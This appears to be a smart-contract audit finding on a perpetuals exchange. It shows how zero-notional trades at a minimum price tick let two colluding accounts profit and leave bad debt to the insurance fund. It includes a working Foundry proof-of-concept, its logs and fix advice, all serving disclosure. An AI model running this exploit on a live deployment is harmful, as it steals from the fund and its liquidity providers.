# Zero-notional opens enable free profit and can harm the insurance fund

Attackers can open positions with non-zero base but zero quote, then close at normal prices for one-sided profit, pushing losses onto the insurance fund and/or liquidity providers.

Perpetuals matching and settlement in `@CLOBLib.sol` and `@Book.sol` allow trades where a non-zero `baseTraded` settles with `quoteTraded` that is zero or effectively near-zero due to price/tick/lot-size interactions and integer rounding. The code enforces a `ZeroOrder()` invariant (reverting only if nothing is matched or posted) but does not enforce a “zero-cost trade” invariant (i.e., disallowing trades that move position while paying zero/near-zero quote). This permits opening positions with near-zero notional and later closing them at normal prices to realize un-backed profit, with the loss socialized to the insurance fund when the counterparty cannot cover the deficit. Divergence guards do not prevent abnormally low asks from matching buys, making this exploitable with maker orders priced at extremely small but valid positive prices.

From a high level:

- Matching happens inside `@CLOBLib.sol` (`_matchIncomingBid()`, `_matchIncomingAsk()`, `_matchIncomingOrder()`), which always uses the maker’s limit price to compute the trade.

File: [`contracts/perps/types/CLOBLib.sol`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/CLOBLib.sol#L400-L457)

```solidity
function _matchIncomingOrder(
    Book storage ds,
    Order storage matchedOrder,
    Order memory incomingOrder,
    bool baseDenominated
) internal returns (__TradeData__ memory tradeData) {
    // ...
    tradeData = ds.getTradedAmounts({
        makerBase: matchedOrder.amount,
        takerAmount: incomingOrder.amount,
        price: matchedOrder.price,
        baseDenominated: baseDenominated
    });

    if (tradeData.baseTraded == 0) return tradeData;
    // No guard for (baseTraded > 0 && quoteTraded == 0)
    // ... proceeds with settlement using quoteTraded as-is
}
```

- Trade sizing and cash leg are computed in `@Book.sol` via `BookLib.getTradedAmounts()`, which rounds the base fill to lot size and computes `quoteTraded = baseTraded.fullMulDiv(price, 1e18)`. Integer division floors to zero (or near-zero) if `price` is tiny and/or `lotSize` is small.

File: [`contracts/perps/types/Book.sol`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/Book.sol#L151-L173)

```solidity
function getTradedAmounts(
    Book storage self,
    uint256 makerBase,
    uint256 takerAmount,
    uint256 price,
    bool baseDenominated
) internal view returns (__TradeData__ memory tradeData) {
    uint256 lotSize = self.config.lotSize;

    uint256 takerBase = baseDenominated
        ? takerAmount
        : takerAmount.fullMulDiv(1e18, price);

    takerBase -= tradeData.baseTraded =
        (makerBase.min(takerBase) / lotSize) *
        lotSize;                              // base leg rounded to lot size

    tradeData.quoteTraded = tradeData.baseTraded.fullMulDiv(price, 1e18); // floors → zero/near-zero at tiny price

    if (takerBase < lotSize) {
        tradeData.filledAmount = takerAmount; // dust handling for quote-denominated takers
    } else {
        tradeData.filledAmount = baseDenominated
            ? tradeData.baseTraded
            : tradeData.quoteTraded;
    }
}
```

- The perps path enforces `ZeroOrder()` in `CLOBLib.placeOrder()` (revert when nothing matched or posted), but there is no equivalent `ZeroCostTrade` guard. Consequently, it allows `baseTraded > 0` and `quoteTraded == 0` to proceed to settlement.

File: [`contracts/perps/types/CLOBLib.sol`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/CLOBLib.sol#L137-L155)

```solidity
 function placeOrder(address account, PlaceOrderArgs memory args, BookType bookType)
    internal
    returns (PlaceOrderResult memory result)
{
    ...
    ...

    if (result.baseTraded + result.quoteTraded + result.basePosted == 0) revert ZeroOrder();
```

- Divergence checks gate only excessively high asks for buy-side matching and excessively low bids for sell-side matching; they do not prevent excessively low asks from matching buys, which is precisely where a near-zero maker price can be used.

File: [`contracts/perps/types/Market.sol`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/Market.sol#L414-L419)

```solidity
function getMaxDivergingAskPrice(
    Market storage self
) internal view returns (uint256) {
    uint256 mark = self.markPrice;
    uint256 maxDivergence = mark.fullMulDiv(
        StorageLib.loadMarketSettings(self.asset).divergenceCap,
        1e18
    );
    return mark + maxDivergence; // Only a ceiling; too-low asks are not blocked
}
```

File: [`contracts/perps/types/Position.sol`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/Position.sol#L74-L128)

```solidity
function _open(
    Position memory self,
    Side side,
    uint256 quoteTraded,   // ≈ 0 at tiny-price open
    uint256 baseTraded     // > 0 (e.g., 1 lot)
) private pure returns (int256 marginDelta) {
    if (self.leverage == 0) self.leverage = 1e18;
    self.isLong = side == Side.BUY;
    self.amount += baseTraded;           // size increases
    self.openNotional += quoteTraded;    // adds ≈0 → position carries ≈0 open notional
    marginDelta = quoteTraded.fullMulDiv(1e18, self.leverage).toInt256(); // ≈0 margin on open
}

function _close(
    Position memory self,
    Side side,
    uint256 quoteTraded,   // close at normal price → large quote
    uint256 baseTraded
) private pure returns (PositionUpdateResult memory result) {
    __CloseCache__ memory cache;
    cache.closeSize = self.amount.min(baseTraded);
    cache.closedOpenNotional = self.openNotional.fullMulDiv(cache.closeSize, self.amount); // ≈0
    cache.currentNotional = quoteTraded.fullMulDiv(cache.closeSize, baseTraded);           // reflects normal price
    result.rpnl = _pnl(self.isLong, cache.closedOpenNotional, cache.currentNotional);      // ≈ full PnL on close
}
```

Concretely:

- `@Book.sol`:
  - `assertLimitPriceInBounds()` requires `price != 0` and `price % tickSize == 0`. No minimum positive price is enforced beyond divisibility.
  - `getTradedAmounts()` computes `tradeData.baseTraded = floor(min(makerBase, takerBase) / lotSize) * lotSize` and then `tradeData.quoteTraded = floor(baseTraded * price / 1e18)`. Because the multiply/divide uses integer arithmetic, `quoteTraded` becomes zero whenever `baseTraded * price < 1e18`. Concretely, for a single lot this means if `price < 1e18 / lotSize` (price and tick expressed in the contract's 1e18-fixed units), then a non-zero `baseTraded` can produce `quoteTraded == 0`.
- `@CLOBLib.sol`:
  - `placeOrder()` reverts `ZeroOrder()` only when `baseTraded + quoteTraded + basePosted == 0`, so zero-cost-but-non-zero-base trades are allowed through.
  - `_matchIncomingOrder()` pulls `tradeData` from `BookLib.getTradedAmounts()` and proceeds unless `tradeData.baseTraded == 0`. No check exists for `tradeData.baseTraded > 0 && tradeData.quoteTraded == 0`.
  - Divergence gating in `_matchIncomingBid()` breaks when `bestAsk > maxAsk` but allows arbitrarily low asks to match; buyers (including market buys) can therefore match against near-zero ask prices.

Root cause:

- Absence of a zero-cost trade invariant in perps matching/settlement combined with:
  - Maker price can be arbitrarily small (so long as positive and tick-aligned).
  - Lot sizes can be much smaller than 1e18 base units.
  - Divergence guards do not block extremely low asks for buy-side matching.
  - Integer rounding in `quoteTraded` uses floor division.

Highest-impact scenario:

- An attacker opens positions with zero notional (by trading at a tiny price) and later closes them at normal prices to realize one-sided profit. The losing counterparty (which could be another attacker-controlled, under-margined address) accrues matching losses, if that account cannot cover, the deficit is socialized to the insurance fund and/or liquidity providers. Inside the PoC it's introduced how we can harm the protocol multiple times. Also because taker/maker fees are computed on `quoteTraded`, they are also zero in the zero-cost open, reducing friction.

Consequences:

- Theft from the insurance fund via organized zero-notional opens followed by normal-price closes.
- Risk accounting divergence (positions with amount > 0 but open notional ~ 0) undermines leverage/margin semantics.
- Fee evasion on the zero-cost leg (maker/taker fees based on `quoteTraded` = 0).

## Proof of Concept

The PoC introduce this scenario:

1. Attacker A (jb) opens a normal-sized short so they can later post orders.
2. Attacker A adds a small margin buffer (so they are not immediately liquidatable).
3. Attacker A posts a maker ask at the minimum tick such that `quoteTraded ≈ 0` for a full lot (zero-notional open).
4. Attacker B (rite) crosses the book and buys that lot (base > 0, quote ≈ 0).
5. The test pumps the mark price so the maker becomes undercollateralized.
6. The maker is liquidated and liquidation settlement runs.
7. Attacker B closes the long and realizes profit.

Please add the file inside [`test/c4-poc/PoCPerps.t.sol`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/test/c4-poc/PoCPerps.t.sol) and run `forge test --match-test test_submissionValidity -vvv`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PerpManagerTestBase} from "../perps/PerpManagerTestBase.sol";
import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";
import {Side, TiF} from "../../contracts/perps/types/Enums.sol";
import {PlaceOrderArgs, PlaceOrderResult} from "../../contracts/perps/types/Structs.sol";
import {Position} from "../../contracts/perps/types/Position.sol";

contract PoCPerps is PerpManagerTestBase {
    using FixedPointMathLib for *;
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * ================PERPETUAL================
     * - factory: ERC1967Factory.sol
     * - perpManager: MockPerpManager.sol (extends PerpManager.sol)
     * - gtl: GTL.sol
     * - usdc: Test USDC within perpetual system
     * - ETH, GTE, BTC: Tickers for markets created
     */
    function test_submissionValidity() external {
        // BTC market created in setUp with lotSize=tickSize=0.001e18, mark=100_000e18
        uint256 lot = perpManager.getLotSize(BTC); // 0.001e18
        uint256 tick = perpManager.getTickSize(BTC); // 0.001e18
        uint256 normal = perpManager.getMarkPrice(BTC); // 100_000e18 (initial)

        // Sanity on configuration used for the PoC
        assertEq(lot, 0.001e18, "unexpected lot size");
        assertEq(tick, 0.001e18, "unexpected tick size");
        assertEq(normal, 100_000e18, "unexpected mark price");

        // Seed insurance fund so claims (bad debt) do not revert
        vm.prank(admin);
        perpManager.insuranceFundDeposit(1_000e18); // $1000 USDC

        // LOG: initial balances
        emit log_named_uint(
            "IFund_before",
            perpManager.getInsuranceFundBalance()
        );
        emit log_named_uint(
            "Maker_free_before",
            perpManager.getFreeCollateralBalance(jb)
        );
        emit log_named_int(
            "Maker_margin_before",
            perpManager.getMarginBalance(jb, 1)
        );
        emit log_named_uint(
            "Taker_free_before",
            perpManager.getFreeCollateralBalance(rite)
        );
        emit log_named_int(
            "Taker_margin_before",
            perpManager.getMarginBalance(rite, 1)
        );

        // Capture pre-state
        uint256 ifundBefore = perpManager.getInsuranceFundBalance();
        uint256 takerFreeBefore = perpManager.getFreeCollateralBalance(rite);

        // 1) Attacker wallet 1 (jb) opens short position with a normal fill so margin exists and addMargin is allowed
        _placeTrade({
            asset: BTC,
            taker: nate,
            maker: jb,
            price: normal,
            amount: lot,
            side: Side.BUY,
            subaccount: 1
        });

        // 2) Add small margin to maker so the tiny-price leg won't make them liquidatable
        vm.prank(jb);
        perpManager.addMargin(jb, 1, 3e18); // only $3

        // 3) Maker (jb) now posts a tiny-price ask at the minimum tick, for 1 lot
        _createLimitOrder({
            asset: BTC,
            maker: jb,
            subaccount: 1,
            price: tick, // 0.001e18
            amount: lot, // 0.001e18 - 1 lot
            side: Side.SELL
        });
        // Here under the hood now when we fill the order
        // jb’s short got bigger, but the “cost recorded” (openNotional) for that extra 0.001 BTC is ≈ 0.
        // which means a bigger position but almost no notional added!

        // 4) Attacker wallet 2 - Taker (rite) submits IOC BUY for 1 lot crossing the book at a normal limit price and filling the order
        vm.prank(rite);
        PlaceOrderResult memory res = perpManager.placeOrder(
            rite,
            PlaceOrderArgs({
                subaccount: 1,
                asset: BTC,
                side: Side.BUY,
                limitPrice: normal,
                amount: lot,
                baseDenominated: true,
                tif: TiF.IOC,
                expiryTime: 0,
                clientOrderId: 0,
                reduceOnly: false
            })
        );

        // 5) Pump mark with 10k so maker becomes liquidatable and underwater
        uint256 newMark = 110_000e18;
        perpManager.mockSetMarkPrice(BTC, newMark);

        // 6) Provide enough ask liquidity at new mark to close maker short via liquidation
        uint256 makerAmt = perpManager.getPosition(BTC, jb, 1).amount;
        _createLimitOrder({
            asset: BTC,
            maker: julien,
            subaccount: 1,
            price: newMark,
            amount: makerAmt,
            side: Side.SELL
        });

        // 7) Liquidate maker (jb)
        vm.prank(admin);
        perpManager.liquidate(BTC, jb, 1);

        // 8) Now realize the taker's profit by closing the taker long
        // for that we need a limit order
        _createLimitOrder({
            asset: BTC,
            maker: nate,
            subaccount: 1,
            price: newMark,
            amount: lot,
            side: Side.BUY
        });

        // 9) Attacker wallet 2 - Taker (rite) closes the taker long collecting the profit
        vm.prank(rite);
        res = perpManager.placeOrder(
            rite,
            PlaceOrderArgs({
                subaccount: 1,
                asset: BTC,
                side: Side.SELL,
                limitPrice: newMark,
                amount: lot,
                baseDenominated: true,
                tif: TiF.IOC,
                expiryTime: 0,
                clientOrderId: 0,
                reduceOnly: false
            })
        );

        // LOG: final balances showing bad debt claimed from insurance fund and taker profit realized
        emit log_named_uint(
            "IFund_after",
            perpManager.getInsuranceFundBalance()
        );
        emit log_named_uint(
            "Maker_free_after",
            perpManager.getFreeCollateralBalance(jb)
        );
        emit log_named_int(
            "Maker_margin_after",
            perpManager.getMarginBalance(jb, 1)
        );
        emit log_named_uint(
            "Taker_free_after",
            perpManager.getFreeCollateralBalance(rite)
        );
        emit log_named_int(
            "Taker_margin_after",
            perpManager.getMarginBalance(rite, 1)
        );

        // Assert exploit impact
        uint256 ifundAfter = perpManager.getInsuranceFundBalance();
        uint256 takerFreeAfter = perpManager.getFreeCollateralBalance(rite);
        assertLt(
            ifundAfter,
            ifundBefore,
            "Insurance fund should decrease (bad debt covered)"
        );
        assertGt(
            takerFreeAfter,
            takerFreeBefore,
            "Taker should realize profit"
        );
        assertEq(
            perpManager.getPosition(BTC, rite, 1).amount,
            0,
            "Taker position should be closed"
        );
    }
}
```

Logs:

```
Ran 1 test for test/c4-poc/PoCPerps.t.sol:PoCPerps
[PASS] test_submissionValidity() (gas: 2044503)
Logs:
  IFund_before: 1000000000000000000000
  Maker_free_before: 50000000000000000000000000
  Maker_margin_before: 0
  Taker_free_before: 50000000000000000000000000
  Taker_margin_before: 0
  IFund_after: 983075002000200000000
  Maker_free_after: 49999997000000000000000000
  Maker_margin_after: 0
  Taker_free_after: 50000109977998999800000000
  Taker_margin_after: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.48ms (4.07ms CPU time)
```

After this run the insurance fund fell from `1000` USDC to `~983` USDC — a loss of `~16.92` USDC.  
The maker (`jb`) lost `3` USDC, the taker (`rite`) gained ≈ `~109.97` USDC, and the remaining ≈ `~90.05` USDC was absorbed by liquidation counterparties / liquidity providers. We can repeat this scenario multiple times.

## Recommended mitigation steps

- Add a zero-cost trade invariant in perps matching inside `@CLOBLib.sol/_matchIncomingOrder()` to prevents zero-notional opens.

- Enforce a price–lot lower bound:

  - Ensure the minimum allowed maker price satisfies `lotSize * minPrice / 1e18 ≥ 1`, i.e., `minPrice ≥ ceil(1e18 / lotSize)`. Enforce this inside `@Book.sol/assertLimitPriceInBounds()`.
  - Alternatively, encode the bound during market configuration (reject unsafe combinations of `tickSize` and `lotSize`).

- Symmetrize divergence protection:
  - For buy-side matching, also break if the current `bestAsk` is “too low” relative to the mark (e.g., `bestAsk < mark - maxDivergence`). This reinforces the guardrail against pathological asks.
